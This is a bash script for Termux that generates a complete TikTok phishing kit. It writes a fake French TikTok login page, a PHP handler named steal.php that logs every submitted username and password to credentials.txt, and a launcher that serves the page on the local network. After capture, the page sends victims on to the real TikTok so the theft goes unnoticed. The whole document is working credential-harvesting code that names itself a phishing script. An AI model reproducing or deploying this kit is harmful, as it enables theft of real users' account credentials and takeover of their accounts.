#!/data/data/com.termux/files/usr/bin/bash

PHISH_DIR="$HOME/tiktok_phish"
HTML_FILE="$PHISH_DIR/index.html"
SERVER_PID=""

trap "kill $SERVER_PID 2>/dev/null; rm -rf $PHISH_DIR; exit" INT TERM EXIT

mkdir -p $PHISH_DIR
cd $PHISH_DIR

cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion • TikTok</title>
    <link rel="stylesheet" href="https://www.tiktokv.com/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif; background: linear-gradient(135deg,#667eea 0%,#764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; max-width: 400px; width: 90%; }
        .header { background: linear-gradient(135deg,#ff0050 0%,#ff4d6d 100%); color: white; padding: 30px 20px; text-align: center; }
        .header i { font-size: 48px; margin-bottom: 10px; }
        .header h1 { font-size: 24px; font-weight: 600; }
        .form-container { padding: 40px 30px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-size: 14px; font-weight: 500; }
        .input-group input { width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 12px; font-size: 16px; transition: all 0.3s ease; }
        .input-group input:focus { outline: none; border-color: #ff0050; box-shadow: 0 0 0 3px rgba(255,0,80,0.1); }
        .login-btn { width: 100%; padding: 15px; background: linear-gradient(135deg,#ff0050 0%,#ff4d6d 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; }
        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(255,0,80,0.3); }
        .login-btn:active { transform: translateY(0); }
        .divider { text-align: center; margin: 30px 0; position: relative; }
        .divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: #e1e5e9; }
        .divider span { background: white; padding: 0 20px; color: #666; font-size: 14px; }
        .forgot { text-align: center; margin-top: 20px; }
        .forgot a { color: #ff0050; text-decoration: none; font-size: 14px; }
        #status { display: none; text-align: center; padding: 20px; }
        .success { background: #d4edda; color: #155724; border-radius: 10px; }
        .error { background: #f8d7da; color: #721c24; border-radius: 10px; }
        @media (max-width: 480px) { .container { margin: 20px; width: calc(100% - 40px); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fab fa-tiktok"></i>
            <h1>Connexion</h1>
        </div>
        <div class="form-container">
            <form id="loginForm">
                <div class="input-group">
                    <label>Numéro de téléphone, email ou username</label>
                    <input type="text" id="username" required>
                </div>
                <div class="input-group">
                    <label>Mot de passe</label>
                    <input type="password" id="password" required>
                </div>
                <button type="submit" class="login-btn">Se connecter</button>
            </form>
            <div id="status"></div>
            <div class="divider"><span>ou</span></div>
            <button onclick="useGoogle()" class="login-btn" style="background: #4285f4; margin-bottom: 10px;">
                <i class="fab fa-google"></i> Continuer avec Google
            </button>
            <div class="forgot">
                <a href="#" onclick="alert('Mot de passe oublié ?')">Mot de passe oublié ?</a>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const status = document.getElementById('status');
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            status.textContent = 'Connexion en cours...';
            status.className = 'success';
            status.style.display = 'block';
            
            const data = { username, password, action: 'login' };
            
            try {
                const response = await fetch('/steal.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                if (result.success) {
                    status.innerHTML = '✅ Connexion réussie ! Redirection...';
                    setTimeout(() => {
                        window.location.href = 'https://www.tiktok.com';
                    }, 2000);
                } else {
                    throw new Error(result.message);
                }
            } catch (error) {
                status.textContent = '❌ Erreur de connexion. Réessayez.';
                status.className = 'error';
            }
        });
        
        function useGoogle() {
            alert('Connexion Google non disponible pour le moment.');
        }
    </script>
</body>
</html>
EOF

cat > steal.php << 'EOF'
<?php
header('Content-Type: application/json');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (isset($data['username']) && isset($data['password'])) {
        $log = "[" . date('Y-m-d H:i:s') . "] " . $data['username'] . ":" . $data['password'] . "\n";
        file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
        
        if (!file_exists('credentials.txt')) {
            file_put_contents('credentials.txt', $log);
        }
        
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Données invalides']);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Méthode non autorisée']);
}
?>
EOF

cat > start.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
cd $(dirname $0)
php -S 0.0.0.0:8080 &
PHP_PID=$!
echo $PHP_PID > server.pid
echo "🚀 Serveur démarré sur http://0.0.0.0:8080"
echo "📱 Adresse locale: http://$(ifconfig 2>/dev/null | grep -A1 wlan0 | grep inet | awk '{print $2}' || hostname -I | cut -d' ' -f1):8080"
echo "📝 Credentials: $(pwd)/credentials.txt"
wait $PHP_PID
EOF

chmod +x start.sh

cat << EOF
✅ Script TikTok Phishing créé dans $PHISH_DIR

📱 Pour lancer le serveur:
cd $PHISH_DIR && ./start.sh

📝 Credentials seront sauvés dans: $PHISH_DIR/credentials.txt

🔥 Serveur PHP sur port 8080 (localhost et réseau local)
EOF